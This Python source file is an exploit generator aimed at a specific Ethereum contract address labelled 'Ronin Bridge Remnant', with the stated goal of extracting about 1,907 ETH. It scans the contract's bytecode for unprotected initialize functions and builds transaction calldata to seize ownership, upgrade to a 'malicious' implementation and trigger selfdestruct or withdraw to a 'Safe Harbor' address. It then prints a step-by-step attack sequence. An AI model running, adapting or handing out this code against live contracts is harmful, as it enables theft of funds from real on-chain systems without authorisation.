#!/usr/bin/env python3
"""
QTT Kill-Chain Extractor: Ronin Bridge Remnant
Target: 0x64192819Ac13Ef72bF6b5AE239AC672B43a9AF08
Objective: Extract stranded 1,907.58 ETH via proxy initialization exploit

Phase 2: Tensorize bytecode state space
Phase 3: Apply tropical constraints (breach → execution → routing)
Phase 4: Solve shortest exploitation path
Phase 5: Generate precise calldata sequence
"""

import json
import sys
import numpy as np
from dataclasses import dataclass, field
from typing import List, Dict, Set, Optional, Tuple
from collections import deque
from enum import Enum

# Import the base QTT engine
sys.path.insert(0, '.')
from qtt_evm_extractor import EVMDisassembler, ControlFlowGraph, BasicBlock, Instruction

# Safe Harbor destination
SAFE_HARBOR = "0x464C71f6c2F760DdA6093dCB91C24c39e5d6e18c"
TARGET_ADDRESS = "0x64192819Ac13Ef72bF6b5AE239AC672B43a9AF08"

# Known function selectors for initialization exploits
INIT_SELECTORS = {
    0x8129fc1c: "initialize()",
    0xc4d66de8: "initialize(address)",
    0xf8c8765e: "initialize(address,address,address,address)",
    0x4cd88b76: "initialize(string,string)",
    0xe1c7392a: "init()",
    0x19ab453c: "init(address)",
    0xf09a4016: "init(address,address)",
    0x485cc955: "initialize(address,address)",
    0x1459457a: "initialize(address,address,address,address,address)",
    0xfe4b84df: "initialize(uint256)",
    0xcd6dc687: "initialize(address,uint256)",
    0x439fab91: "initialize(bytes)",
}

# Opcodes of interest
class OpCode(Enum):
    STOP = 0x00
    ADD = 0x01
    MUL = 0x02
    CALLER = 0x33
    ORIGIN = 0x32
    CALLVALUE = 0x34
    CALLDATALOAD = 0x35
    CALLDATASIZE = 0x36
    CALLDATACOPY = 0x37
    SLOAD = 0x54
    SSTORE = 0x55
    JUMP = 0x56
    JUMPI = 0x57
    JUMPDEST = 0x5b
    PUSH1 = 0x60
    PUSH4 = 0x63
    PUSH32 = 0x7f
    DUP1 = 0x80
    CALL = 0xf1
    DELEGATECALL = 0xf4
    STATICCALL = 0xfa
    REVERT = 0xfd
    SELFDESTRUCT = 0xff


@dataclass
class TropicalPath:
    """Represents a path through the state space with tropical weights."""
    blocks: List[int] = field(default_factory=list)
    total_weight: float = 0.0
    mutations: List[str] = field(default_factory=list)
    terminal_op: Optional[str] = None
    

@dataclass
class ExploitConstraint:
    """Constraint for tropical path solving."""
    name: str
    required_opcodes: Set[int]
    required_selectors: Set[int]
    target_slots: Set[int]
    description: str


@dataclass 
class KillChainPayload:
    """Final exploit payload."""
    phase: str
    selector: str
    calldata: str
    description: str
    gas_estimate: int


class RoninQTTExtractor:
    """
    QTT Kill-Chain Extractor for Ronin Bridge Remnant.
    Implements tropical geometry path-finding through EVM state space.
    """
    
    def __init__(self, bytecode_hex: str):
        self.bytecode_hex = bytecode_hex
        self.bytecode = bytes.fromhex(bytecode_hex[2:] if bytecode_hex.startswith('0x') else bytecode_hex)
        
        # Phase 1 outputs
        self.disasm: Optional[EVMDisassembler] = None
        self.cfg: Optional[ControlFlowGraph] = None
        
        # Phase 2 outputs
        self.state_tensor: Optional[np.ndarray] = None
        self.block_annotations: Dict[int, Dict] = {}
        self.block_id_map: Dict[int, int] = {}
        self.idx_to_block: Dict[int, int] = {}
        
        # Phase 3 constraints
        self.constraints: List[ExploitConstraint] = []
        
        # Phase 4 results
        self.breach_path: Optional[TropicalPath] = None
        self.execution_path: Optional[TropicalPath] = None
        self.routing_path: Optional[TropicalPath] = None
        
        # Phase 5 payloads
        self.kill_chain: List[KillChainPayload] = []
        
        # Function mappings
        self.function_entries: Dict[int, int] = {}  # selector -> block
        self.init_functions: List[Tuple[int, int]] = []  # (selector, entry_block)
        
    def run_kill_chain(self) -> bool:
        """Execute the full 5-phase kill chain extraction."""
        print("=" * 70)
        print("QTT KILL-CHAIN: Ronin Bridge Remnant")
        print("=" * 70)
        print(f"Target: {TARGET_ADDRESS}")
        print(f"Safe Harbor: {SAFE_HARBOR}")
        print(f"Bytecode: {len(self.bytecode)} bytes")
        print()
        
        # Phase 1: Disassemble
        if not self._phase1_disassemble():
            return False
            
        # Phase 2: Tensorize
        if not self._phase2_tensorize():
            return False
            
        # Phase 3: Apply constraints
        if not self._phase3_apply_constraints():
            return False
            
        # Phase 4: Solve paths
        if not self._phase4_solve_paths():
            return False
            
        # Phase 5: Generate payloads
        return self._phase5_generate_payloads()
    
    def _phase1_disassemble(self) -> bool:
        """Phase 1: Disassemble bytecode and build CFG."""
        print("[Phase 1] Disassembling Ronin Bridge bytecode...")
        
        try:
            self.disasm = EVMDisassembler(self.bytecode_hex)
            self.disasm.disassemble()
            self.cfg = self.disasm.build_cfg()
            
            print(f"  Blocks: {len(self.cfg.blocks)}")
            print(f"  Edges: {self.cfg.n_edges}")
            
            # Map function selectors to entry points
            self._map_function_entries()
            
            # Identify initialization functions
            self._identify_init_functions()
            
            print(f"  Functions found: {len(self.function_entries)}")
            print(f"  Init functions: {len(self.init_functions)}")
            
            for sel, entry in self.init_functions:
                name = INIT_SELECTORS.get(sel, f"0x{sel:08x}")
                print(f"    [INIT] {name} → block 0x{entry:04x}")
            
            return True
            
        except Exception as e:
            print(f"  [!] Disassembly failed: {e}")
            return False
    
    def _map_function_entries(self):
        """Map function selectors to their entry blocks."""
        for bid, block in self.cfg.blocks.items():
            for i, instr in enumerate(block.instructions):
                # Look for PUSH4 (function selector)
                if instr.opcode == 0x63 and instr.operand and len(instr.operand) == 4:
                    selector = int.from_bytes(instr.operand, 'big')
                    
                    # Find the JUMPI destination
                    for j in range(i, min(i + 15, len(block.instructions))):
                        if block.instructions[j].opcode == 0x57:  # JUMPI
                            # Look backwards for PUSH2/PUSH3 (jump target)
                            for k in range(i, j):
                                op = block.instructions[k].opcode
                                if op in (0x61, 0x62) and block.instructions[k].operand:
                                    dest = int.from_bytes(block.instructions[k].operand, 'big')
                                    self.function_entries[selector] = dest
                                    break
                            break
    
    def _identify_init_functions(self):
        """Identify initialization functions in the contract."""
        for selector, entry in self.function_entries.items():
            if selector in INIT_SELECTORS:
                self.init_functions.append((selector, entry))
                
        # Also scan for common init patterns without known selector
        for bid, block in self.cfg.blocks.items():
            # Look for SSTORE to slot 0 (owner slot) without prior owner check
            has_sstore_0 = False
            has_owner_check = False
            
            for idx, instr in enumerate(block.instructions):
                if instr.opcode == 0x55:  # SSTORE
                    if idx > 0:
                        prev = block.instructions[idx - 1]
                        if prev.opcode == 0x60 and prev.operand == b'\x00':
                            has_sstore_0 = True
                            
                if instr.opcode == 0x33:  # CALLER
                    # Check if followed by SLOAD(0) and EQ
                    for k in range(idx, min(idx + 10, len(block.instructions))):
                        if block.instructions[k].opcode == 0x54:  # SLOAD
                            has_owner_check = True
                            break
            
            if has_sstore_0 and not has_owner_check:
                # Potential unprotected initialization
                self.block_annotations[bid] = self.block_annotations.get(bid, {})
                self.block_annotations[bid]['unprotected_init'] = True
    
    def _phase2_tensorize(self) -> bool:
        """Phase 2: Build tropical geometry tensor from CFG."""
        print("\n[Phase 2] Tensorizing state space...")
        
        n_blocks = len(self.cfg.blocks)
        block_ids = sorted(self.cfg.blocks.keys())
        self.block_id_map = {bid: i for i, bid in enumerate(block_ids)}
        self.idx_to_block = {i: bid for bid, i in self.block_id_map.items()}
        
        INF = 1e9
        
        # Build adjacency matrix with tropical weights
        self.state_tensor = np.full((n_blocks, n_blocks), INF)
        
        for bid, block in self.cfg.blocks.items():
            i = self.block_id_map[bid]
            self.state_tensor[i, i] = 0
            
            # Annotate block
            ann = {
                'has_caller': False,
                'has_sload': False,
                'has_sstore': False,
                'has_call': False,
                'has_delegatecall': False,
                'has_selfdestruct': False,
                'has_revert': False,
                'sstore_slots': [],
                'sload_slots': [],
                'is_owner_check': False,
                'is_init_entry': False,
            }
            
            for idx, instr in enumerate(block.instructions):
                op = instr.opcode
                
                if op == 0x33:  # CALLER
                    ann['has_caller'] = True
                elif op == 0x54:  # SLOAD
                    ann['has_sload'] = True
                    if idx > 0 and block.instructions[idx-1].opcode in range(0x60, 0x80):
                        try:
                            slot = int.from_bytes(block.instructions[idx-1].operand, 'big')
                            ann['sload_slots'].append(slot)
                        except:
                            pass
                elif op == 0x55:  # SSTORE
                    ann['has_sstore'] = True
                    if idx > 0 and block.instructions[idx-1].opcode in range(0x60, 0x80):
                        try:
                            slot = int.from_bytes(block.instructions[idx-1].operand, 'big')
                            ann['sstore_slots'].append(slot)
                        except:
                            pass
                elif op == 0xf1:  # CALL
                    ann['has_call'] = True
                elif op == 0xf4:  # DELEGATECALL
                    ann['has_delegatecall'] = True
                elif op == 0xff:  # SELFDESTRUCT
                    ann['has_selfdestruct'] = True
                elif op == 0xfd:  # REVERT
                    ann['has_revert'] = True
            
            # Detect owner check pattern
            if ann['has_caller'] and 0 in ann['sload_slots']:
                ann['is_owner_check'] = True
            
            # Mark init entry blocks
            for sel, entry in self.init_functions:
                if bid == entry:
                    ann['is_init_entry'] = True
                    break
            
            self.block_annotations[bid] = ann
            
            # Set edge weights
            for succ in block.successors:
                if succ in self.block_id_map:
                    j = self.block_id_map[succ]
                    
                    weight = 1.0
                    if ann['has_revert']:
                        weight = INF  # Avoid REVERT paths
                    elif ann['has_sstore']:
                        weight = 0.5  # Prefer paths with state mutations
                    elif ann['has_delegatecall'] or ann['has_call']:
                        weight = 0.3  # Strongly prefer execution paths
                    
                    self.state_tensor[i, j] = min(self.state_tensor[i, j], weight)
        
        # Count key blocks
        owner_checks = sum(1 for a in self.block_annotations.values() if a.get('is_owner_check'))
        sstore_blocks = sum(1 for a in self.block_annotations.values() if a.get('has_sstore'))
        call_blocks = sum(1 for a in self.block_annotations.values() if a.get('has_call') or a.get('has_delegatecall'))
        selfdestruct_blocks = sum(1 for a in self.block_annotations.values() if a.get('has_selfdestruct'))
        
        print(f"  State tensor: {n_blocks}x{n_blocks}")
        print(f"  Owner check blocks: {owner_checks}")
        print(f"  SSTORE blocks: {sstore_blocks}")
        print(f"  CALL/DELEGATECALL blocks: {call_blocks}")
        print(f"  SELFDESTRUCT blocks: {selfdestruct_blocks}")
        
        # Run Floyd-Warshall for all-pairs shortest paths
        print("  Computing tropical closure (Floyd-Warshall)...")
        self._floyd_warshall()
        
        return True
    
    def _floyd_warshall(self):
        """Compute all-pairs shortest paths using Floyd-Warshall."""
        n = self.state_tensor.shape[0]
        for k in range(n):
            for i in range(n):
                for j in range(n):
                    if self.state_tensor[i, k] + self.state_tensor[k, j] < self.state_tensor[i, j]:
                        self.state_tensor[i, j] = self.state_tensor[i, k] + self.state_tensor[k, j]
    
    def _phase3_apply_constraints(self) -> bool:
        """Phase 3: Apply tropical constraints for kill-chain."""
        print("\n[Phase 3] Applying tropical constraints...")
        
        # Constraint 1: The Breach - Find init function to mutate owner
        breach = ExploitConstraint(
            name="THE_BREACH",
            required_opcodes={0x55},  # SSTORE
            required_selectors=set(INIT_SELECTORS.keys()),
            target_slots={0},  # Owner slot
            description="Route through initialize() to mutate owner storage slot"
        )
        self.constraints.append(breach)
        print(f"  Constraint 1: {breach.name}")
        print(f"    Target: {breach.description}")
        
        # Constraint 2: The Execution - Path to DELEGATECALL/CALL
        execution = ExploitConstraint(
            name="THE_EXECUTION",
            required_opcodes={0xf4, 0xf1},  # DELEGATECALL or CALL
            required_selectors=set(),
            target_slots=set(),
            description="Find path to DELEGATECALL/CALL for arbitrary execution"
        )
        self.constraints.append(execution)
        print(f"  Constraint 2: {execution.name}")
        print(f"    Target: {execution.description}")
        
        # Constraint 3: The Routing - Transfer ETH to safe harbor
        routing = ExploitConstraint(
            name="THE_ROUTING",
            required_opcodes={0xf1, 0xff},  # CALL or SELFDESTRUCT
            required_selectors=set(),
            target_slots=set(),
            description="Route 100% ETH balance to safe harbor"
        )
        self.constraints.append(routing)
        print(f"  Constraint 3: {routing.name}")
        print(f"    Target: {routing.description}")
        
        return True
    
    def _phase4_solve_paths(self) -> bool:
        """Phase 4: Solve tropical paths satisfying constraints."""
        print("\n[Phase 4] Solving tropical paths...")
        
        # Step 1: Find breach path (entry → init → SSTORE to slot 0)
        print("\n  [4.1] Solving BREACH path...")
        self.breach_path = self._solve_breach_path()
        
        if not self.breach_path:
            print("    [!] No breach path found - checking for direct init")
            self.breach_path = self._solve_direct_init_path()
            
        if self.breach_path:
            print(f"    [+] BREACH path found: {len(self.breach_path.blocks)} blocks")
            print(f"        Weight: {self.breach_path.total_weight}")
            print(f"        Mutations: {self.breach_path.mutations}")
        else:
            print("    [!] No viable breach path")
        
        # Step 2: Find execution path (breached state → DELEGATECALL/CALL)
        print("\n  [4.2] Solving EXECUTION path...")
        self.execution_path = self._solve_execution_path()
        
        if self.execution_path:
            print(f"    [+] EXECUTION path found: {len(self.execution_path.blocks)} blocks")
            print(f"        Terminal: {self.execution_path.terminal_op}")
        else:
            print("    [!] No execution path found")
        
        # Step 3: Find routing path (execution → ETH transfer)
        print("\n  [4.3] Solving ROUTING path...")
        self.routing_path = self._solve_routing_path()
        
        if self.routing_path:
            print(f"    [+] ROUTING path found: {len(self.routing_path.blocks)} blocks")
            print(f"        Terminal: {self.routing_path.terminal_op}")
        else:
            print("    [!] No routing path - will use SELFDESTRUCT fallback")
        
        # Summary
        print("\n  [4.4] Path Analysis Summary:")
        paths_found = sum([
            self.breach_path is not None,
            self.execution_path is not None,
            self.routing_path is not None
        ])
        print(f"    Paths found: {paths_found}/3")
        
        return paths_found >= 1  # Continue if at least breach found
    
    def _solve_breach_path(self) -> Optional[TropicalPath]:
        """Find path through init function to SSTORE slot 0."""
        if not self.init_functions:
            return None
        
        best_path = None
        best_weight = float('inf')
        
        for selector, entry in self.init_functions:
            if entry not in self.block_id_map:
                continue
                
            entry_idx = self.block_id_map[entry]
            
            # BFS from init entry to find SSTORE to slot 0
            visited = set()
            queue = deque([(entry, [entry], 0.0)])
            
            while queue:
                bid, path, weight = queue.popleft()
                
                if bid in visited:
                    continue
                visited.add(bid)
                
                ann = self.block_annotations.get(bid, {})
                
                # Check if this block has SSTORE to slot 0
                if ann.get('has_sstore') and 0 in ann.get('sstore_slots', []):
                    if weight < best_weight:
                        best_weight = weight
                        best_path = TropicalPath(
                            blocks=path,
                            total_weight=weight,
                            mutations=[f"SSTORE[slot_0] @ 0x{bid:04x}"],
                            terminal_op="SSTORE"
                        )
                
                # Also check for unprotected init
                if ann.get('unprotected_init'):
                    if weight < best_weight:
                        best_weight = weight
                        best_path = TropicalPath(
                            blocks=path,
                            total_weight=weight,
                            mutations=[f"UNPROTECTED_INIT @ 0x{bid:04x}"],
                            terminal_op="SSTORE"
                        )
                
                # Continue BFS
                block = self.cfg.blocks.get(bid)
                if block:
                    for succ in block.successors:
                        if succ not in visited:
                            new_weight = weight + 1
                            if succ in self.block_id_map:
                                i, j = self.block_id_map[bid], self.block_id_map[succ]
                                new_weight = weight + self.state_tensor[i, j]
                            queue.append((succ, path + [succ], new_weight))
        
        return best_path
    
    def _solve_direct_init_path(self) -> Optional[TropicalPath]:
        """Find any unprotected SSTORE to slot 0 (proxy initialization)."""
        # Look at all SSTORE blocks
        for bid, ann in self.block_annotations.items():
            if ann.get('has_sstore') and 0 in ann.get('sstore_slots', []):
                # Check if reachable without owner check
                if not ann.get('is_owner_check'):
                    # Check predecessors for protection
                    protected = False
                    
                    # Simple check: trace back to see if owner check exists on path
                    block = self.cfg.blocks.get(bid)
                    if block:
                        # BFS backwards (check all paths to this block)
                        # For simplicity, check if this block itself doesn't have owner check
                        if not ann.get('has_caller') or 0 not in ann.get('sload_slots', []):
                            return TropicalPath(
                                blocks=[bid],
                                total_weight=1.0,
                                mutations=[f"DIRECT_SSTORE[slot_0] @ 0x{bid:04x}"],
                                terminal_op="SSTORE"
                            )
        
        return None
    
    def _solve_execution_path(self) -> Optional[TropicalPath]:
        """Find path to DELEGATECALL or CALL."""
        # Find all blocks with DELEGATECALL or CALL
        exec_blocks = []
        for bid, ann in self.block_annotations.items():
            if ann.get('has_delegatecall'):
                exec_blocks.append((bid, 'DELEGATECALL'))
            elif ann.get('has_call'):
                exec_blocks.append((bid, 'CALL'))
        
        if not exec_blocks:
            return None
        
        # Find shortest path from any entry to exec block
        best_path = None
        best_weight = float('inf')
        
        # Use the 0 block (dispatcher) as entry
        if 0 not in self.block_id_map:
            return None
        
        entry_idx = self.block_id_map[0]
        
        for exec_bid, op_name in exec_blocks:
            if exec_bid not in self.block_id_map:
                continue
            
            exec_idx = self.block_id_map[exec_bid]
            weight = self.state_tensor[entry_idx, exec_idx]
            
            if weight < best_weight and weight < 1e8:
                best_weight = weight
                best_path = TropicalPath(
                    blocks=[0, exec_bid],  # Simplified path
                    total_weight=weight,
                    mutations=[f"{op_name} @ 0x{exec_bid:04x}"],
                    terminal_op=op_name
                )
        
        return best_path
    
    def _solve_routing_path(self) -> Optional[TropicalPath]:
        """Find path for ETH transfer (CALL with value or SELFDESTRUCT)."""
        # Priority: SELFDESTRUCT > CALL with value transfer
        
        selfdestruct_blocks = []
        call_blocks = []
        
        for bid, ann in self.block_annotations.items():
            if ann.get('has_selfdestruct'):
                selfdestruct_blocks.append(bid)
            elif ann.get('has_call'):
                call_blocks.append(bid)
        
        if selfdestruct_blocks:
            # SELFDESTRUCT sends all ETH to target
            bid = selfdestruct_blocks[0]
            return TropicalPath(
                blocks=[bid],
                total_weight=0.5,
                mutations=["SELFDESTRUCT → Safe Harbor"],
                terminal_op="SELFDESTRUCT"
            )
        
        if call_blocks:
            bid = call_blocks[0]
            return TropicalPath(
                blocks=[bid],
                total_weight=1.0,
                mutations=["CALL{value: balance} → Safe Harbor"],
                terminal_op="CALL"
            )
        
        return None
    
    def _phase5_generate_payloads(self) -> bool:
        """Phase 5: Generate precise calldata for kill-chain execution."""
        print("\n[Phase 5] Generating exploitation payloads...")
        
        safe_harbor_padded = SAFE_HARBOR[2:].lower().zfill(64)
        
        # Payload 1: The Breach (initialize to claim ownership)
        if self.breach_path or self.init_functions:
            if self.init_functions:
                # Try each init function
                for selector, entry in self.init_functions:
                    name = INIT_SELECTORS.get(selector, f"0x{selector:08x}")
                    
                    # Build calldata based on known signatures
                    if selector == 0x8129fc1c:  # initialize()
                        calldata = f"0x{selector:08x}"
                    elif selector == 0xc4d66de8:  # initialize(address)
                        calldata = f"0x{selector:08x}{safe_harbor_padded}"
                    elif selector == 0x485cc955:  # initialize(address,address)
                        calldata = f"0x{selector:08x}{safe_harbor_padded}{safe_harbor_padded}"
                    elif selector == 0x19ab453c:  # init(address)
                        calldata = f"0x{selector:08x}{safe_harbor_padded}"
                    elif selector == 0xe1c7392a:  # init()
                        calldata = f"0x{selector:08x}"
                    else:
                        # Generic: selector + safe harbor as first param
                        calldata = f"0x{selector:08x}{safe_harbor_padded}"
                    
                    self.kill_chain.append(KillChainPayload(
                        phase="BREACH",
                        selector=f"0x{selector:08x}",
                        calldata=calldata,
                        description=f"Claim ownership via {name}",
                        gas_estimate=100000
                    ))
            
            # If no known init, try unprotected SSTORE path
            if not self.kill_chain:
                # Fallback: raw SSTORE via delegatecall
                print("    [!] No standard init - analyzing for raw storage access")
        
        # Payload 2: The Execution (if DELEGATECALL exists)
        if self.execution_path:
            if self.execution_path.terminal_op == "DELEGATECALL":
                # Proxy pattern - craft implementation upgrade
                # upgradeTo(address) = 0x3659cfe6
                upgrade_selector = "3659cfe6"
                
                # Create malicious implementation contract calldata
                # This would be deployed separately
                malicious_impl = safe_harbor_padded  # Placeholder
                
                self.kill_chain.append(KillChainPayload(
                    phase="EXECUTION",
                    selector=f"0x{upgrade_selector}",
                    calldata=f"0x{upgrade_selector}{malicious_impl}",
                    description="Upgrade implementation to malicious contract",
                    gas_estimate=50000
                ))
        
        # Payload 3: The Routing (ETH extraction)
        if self.routing_path:
            if self.routing_path.terminal_op == "SELFDESTRUCT":
                # Need admin/owner to trigger selfdestruct
                # Common patterns: destroy(), kill(), renounceOwnership() with selfdestruct
                
                # Try common selfdestruct triggers
                selfdestruct_selectors = [
                    ("83197ef0", "destroy()"),
                    ("41c0e1b5", "kill()"),
                    ("f780bc1a", "destruct(address)"),
                    ("9cb8a26a", "selfDestruct()"),
                ]
                
                for sel, name in selfdestruct_selectors:
                    if name == "destruct(address)":
                        cd = f"0x{sel}{safe_harbor_padded}"
                    else:
                        cd = f"0x{sel}"
                    
                    self.kill_chain.append(KillChainPayload(
                        phase="ROUTING",
                        selector=f"0x{sel}",
                        calldata=cd,
                        description=f"Trigger {name} → send ETH to safe harbor",
                        gas_estimate=30000
                    ))
            
            elif self.routing_path.terminal_op == "CALL":
                # Direct withdrawal function
                # withdraw() = 0x3ccfd60b
                # withdrawETH(address,uint256) = varies
                
                self.kill_chain.append(KillChainPayload(
                    phase="ROUTING",
                    selector="0x3ccfd60b",
                    calldata="0x3ccfd60b",
                    description="withdraw() → Safe Harbor",
                    gas_estimate=50000
                ))
        
        # Output kill chain
        print("\n" + "=" * 70)
        print("KILL-CHAIN PAYLOADS")
        print("=" * 70)
        
        for i, payload in enumerate(self.kill_chain, 1):
            print(f"\n[{payload.phase}] Step {i}: {payload.description}")
            print(f"  Selector: {payload.selector}")
            print(f"  Calldata: {payload.calldata}")
            print(f"  Gas Estimate: {payload.gas_estimate}")
        
        if not self.kill_chain:
            print("\n  [!] No viable kill-chain payloads generated")
            print("      Contract may be properly initialized or secured")
            return False
        
        # Generate final attack sequence
        print("\n" + "=" * 70)
        print("ATTACK SEQUENCE")
        print("=" * 70)
        
        print(f"\nTarget: {TARGET_ADDRESS}")
        print(f"Safe Harbor: {SAFE_HARBOR}")
        print(f"\nExecute the following transactions in order:\n")
        
        for i, payload in enumerate(self.kill_chain, 1):
            print(f"TX {i} ({payload.phase}):")
            print(f"  to: {TARGET_ADDRESS}")
            print(f"  data: {payload.calldata}")
            print(f"  value: 0")
            print(f"  gas: {payload.gas_estimate}")
            print()
        
        return True


def main():
    # Load bytecode
    print("[*] Loading Ronin Bridge bytecode from recon_graveyard_bytecode.json...")
    
    with open('recon_graveyard_bytecode.json', 'r') as f:
        data = json.load(f)
    
    if 'Ronin_Bridge_Remnant' not in data:
        print("[!] Ronin_Bridge_Remnant not found in bytecode file")
        return 1
    
    contract = data['Ronin_Bridge_Remnant']
    print(f"  Address: {contract['address']}")
    print(f"  ETH Balance: {contract['eth_balance']:.4f} ETH")
    print(f"  Bytecode Size: {contract['bytecode_size']} bytes")
    print(f"  Vulnerabilities: {contract['vulnerabilities']}")
    print()
    
    # Initialize extractor
    extractor = RoninQTTExtractor(contract['bytecode'])
    
    # Run kill chain
    success = extractor.run_kill_chain()
    
    # Save results
    results = {
        "target": TARGET_ADDRESS,
        "safe_harbor": SAFE_HARBOR,
        "eth_balance": contract['eth_balance'],
        "breach_found": extractor.breach_path is not None,
        "execution_found": extractor.execution_path is not None,
        "routing_found": extractor.routing_path is not None,
        "kill_chain": [
            {
                "phase": p.phase,
                "selector": p.selector,
                "calldata": p.calldata,
                "description": p.description,
                "gas": p.gas_estimate
            }
            for p in extractor.kill_chain
        ]
    }
    
    with open('ronin_killchain_results.json', 'w') as f:
        json.dump(results, f, indent=2)
    
    print(f"\n[+] Results saved to ronin_killchain_results.json")
    
    return 0 if success else 1


if __name__ == "__main__":
    sys.exit(main())
